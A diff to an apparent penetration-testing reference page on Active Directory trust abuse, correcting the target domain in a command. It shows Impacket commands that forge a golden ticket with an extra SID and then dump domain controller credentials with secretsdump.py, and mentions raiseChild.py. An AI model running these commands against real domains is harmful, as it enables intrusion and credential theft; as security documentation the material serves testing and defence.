@@ -467,7 +467,7 @@ From UNIX-like systems, [Impacket](https://github.com/fortra/impacket) scripts (
 ticketer.py -nthash "compromised_domain_krbtgt_NT_hash" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" "someusername"
 
 # The ticket can be used directly with any tool supporting Kerberos auth
-KRB5CCNAME="someusername.ccache" secretsdump.py -k -no-pass "target_domain_fqdn/someusername@domain_controller"
+KRB5CCNAME="someusername.ccache" secretsdump.py -k -no-pass "compromised_domain_FQDN/someusername@domain_controller"
 ```
 
 Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled:
